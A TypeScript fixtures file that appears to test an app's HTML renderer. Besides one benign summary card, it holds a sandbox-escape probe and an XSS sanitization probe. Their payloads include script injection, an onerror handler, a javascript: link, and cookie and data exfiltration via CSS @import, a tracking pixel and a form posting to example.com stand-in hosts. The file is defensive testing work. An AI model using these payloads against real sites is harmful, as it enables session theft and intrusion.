/**
 * htmlArtifactFixtures — hand-authored HTML payloads used during Phase 2
 * of v2-information-cortex to verify the HtmlArtifactRenderer end-to-end
 * without yet involving gemma4-generated HTML (Phase 4).
 *
 * TEMPORARY. Remove this file (and the `useHtmlFixtureShortcut` hook that
 * consumes it) when Phase 4 lands the real Studio HTML drawer.
 *
 * Two fixtures:
 *   - BENIGN: a presentable "today summary" card using only allowed tags
 *     and the Tailwind subset. Drives the P2.C / P2.F visual proof.
 *   - MALICIOUS: a payload designed to verify DOMPurify + Shadow DOM
 *     defense in depth. Includes script, onerror, javascript: href,
 *     iframe, style@import, inline style background-image url(), and
 *     <link>. Drives the P2.E sanitization check.
 *
 * Both fixtures are static strings. The render path is identical to any
 * other `'html'` artifact — there is no special-casing.
 */

export const BENIGN_HTML_FIXTURE = `
<div class="p-4 rounded-lg border border-gray-200 bg-white shadow-sm max-w-xl">
  <div class="flex items-center justify-between mb-2">
    <h3 class="text-lg font-semibold text-gray-900 m-0">Today's reading</h3>
    <span class="text-xs uppercase tracking-wide text-emerald-700 bg-emerald-50 rounded px-2 py-1">v2 alpha</span>
  </div>
  <p class="text-sm text-gray-700 mb-4">Three threads worth your attention this morning, ranked by overlap with your active notebooks.</p>
  <ul class="text-sm text-gray-800">
    <li class="mb-2"><strong class="font-semibold">Compiler bootstrap discussions</strong> — three sources converged on the LLVM 19 release notes. <span class="text-gray-500">Knowledge constellation has 8 entries.</span></li>
    <li class="mb-2"><strong class="font-semibold">Privacy-preserving inference</strong> — Anthropic's latest paper cited in two newsletters. <span class="text-gray-500">No notebook coverage yet.</span></li>
    <li class="mb-2"><strong class="font-semibold">Async Rust ergonomics</strong> — sentiment drift detected across four blogs. <span class="text-gray-500">Mostly negative.</span></li>
  </ul>
  <hr />
  <div class="flex items-center justify-between mt-2">
    <span class="text-xs text-gray-500">Generated 2026-06-05 · 08:13</span>
    <a href="#" class="text-xs text-blue-600">Open dashboard →</a>
  </div>
</div>
`.trim();

// Phase 11 — sandbox-escape probe for the InteractiveHtmlArtifactRenderer.
// This payload tries everything we expect WebKit's iframe sandbox + Tauri's
// CSP to block. Open the devtools console and confirm:
//   - No `__lb_p11_pwned*` globals on the parent window.
//   - Network tab shows no requests to example.com.
//   - The iframe height stays bounded (not Infinity).
export const MALICIOUS_INTERACTIVE_FIXTURE = `
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>P11 sandbox probe</title></head>
<body>
  <h2>Phase 11 sandbox isolation probe</h2>
  <p>If any of the lines below say "leaked", we have a problem.</p>
  <ul id="lb-probe-results"></ul>

  <script>
  (function() {
    var ul = document.getElementById('lb-probe-results');
    function report(label, ok) {
      var li = document.createElement('li');
      li.textContent = label + ' — ' + (ok ? 'blocked ✓' : 'LEAKED ✗');
      ul.appendChild(li);
    }

    // 1. Try to read parent localStorage. With sandbox + null origin this
    // throws SecurityError or returns null.
    try {
      var got = window.parent && window.parent.localStorage && window.parent.localStorage.getItem('lb.devHtmlFixture');
      report('parent.localStorage.getItem', got === null || typeof got === 'undefined');
    } catch (_) { report('parent.localStorage.getItem (threw)', true); }

    // 2. Tauri IPC global should be undefined inside the iframe.
    try {
      var tauri = window.parent && window.parent.__TAURI__;
      report('parent.__TAURI__', !tauri);
    } catch (_) { report('parent.__TAURI__ (threw)', true); }

    // 3. Try to fetch the backend — CSP connect-src should not include
    // localhost:8000 from this null-origin context.
    fetch('http://localhost:8000/health').then(function() {
      report('fetch backend', false);
      try { window.parent.__lb_p11_pwned_fetch = true; } catch (_) {}
    }).catch(function() { report('fetch backend', true); });

    // 4. Try to fetch a third-party URL.
    fetch('https://example.com/leak').then(function() {
      report('fetch example.com', false);
    }).catch(function() { report('fetch example.com', true); });

    // 5. Try to set a cookie. Null-origin sandbox blocks document.cookie.
    try {
      document.cookie = 'lb_p11_pwned=1';
      report('document.cookie set', !document.cookie.includes('lb_p11_pwned'));
    } catch (_) { report('document.cookie set (threw)', true); }

    // 6. Try to mark a global on the parent window.
    try {
      window.parent.__lb_p11_pwned_window = true;
      // If we got here without throwing the parent SHOULD still not have it
      // because cross-origin window writes are silently no-op'd; we report
      // optimistically. The real check is in the parent devtools.
      report('parent.window set (silent-fail expected)', true);
    } catch (_) { report('parent.window set (threw)', true); }

    // 7. Resize-flood: ask parent to set Infinity height. Parent must clamp.
    for (var i = 0; i < 5; i++) {
      try { parent.postMessage({type: 'lb-resize', height: Infinity}, '*'); } catch (_) {}
    }
    // 8. Send a normal sane resize so the iframe is visible.
    setTimeout(function() {
      parent.postMessage({type: 'lb-resize', height: document.body.scrollHeight}, '*');
    }, 100);
  })();
  </script>
</body>
</html>
`.trim();


export const MALICIOUS_HTML_FIXTURE = `
<div class="p-4 rounded-lg border border-red-200 bg-red-50 max-w-xl">
  <h3 class="text-lg font-semibold text-red-700 m-0 mb-2">Sanitization probe</h3>
  <p class="text-sm text-gray-700 mb-2">Each item below is a documented attack vector. If you can see any of them executing in the canvas, the layered defense has a gap.</p>

  <!-- 1. Script tag — should be stripped entirely -->
  <script>window.__lb_p2e_pwned = true; alert('XSS via <script>');</script>

  <!-- 2. img onerror handler — should be stripped (or the onerror attr removed) -->
  <img src="x" onerror="window.__lb_p2e_pwned_img = true; alert('XSS via onerror')" />

  <!-- 3. javascript: href — DOMPurify should neutralize the href -->
  <p class="mb-2"><a href="javascript:window.__lb_p2e_pwned_a = true;void 0">Click me (should be inert)</a></p>

  <!-- 4. iframe pointing at attacker page — entire tag should be stripped -->
  <iframe src="https://example.com/attacker" width="100" height="100"></iframe>

  <!-- 5. style with @import — entire <style> should be stripped -->
  <style>@import url('https://example.com/exfil.css?cookie=' + document.cookie);</style>

  <!-- 6. inline style with background-image url() — CSS exfiltration vector;
       style attribute should be stripped -->
  <div style="background-image: url('https://example.com/pixel.gif?leak=1');">
    <strong>Box A</strong> — should have no background image.
  </div>

  <!-- 7. link tag — should be stripped -->
  <link rel="stylesheet" href="https://example.com/attacker.css" />

  <!-- 8. form / action — form tag stripped -->
  <form action="https://example.com/steal" method="post">
    <input type="hidden" name="cookie" />
    <button>Submit (should be inert)</button>
  </form>

  <p class="text-sm text-gray-700 mt-4">Open the devtools network tab. There should be no outbound requests beyond local app traffic. Open the console — no <code>__lb_p2e_pwned*</code> globals should exist.</p>
</div>
`.trim();
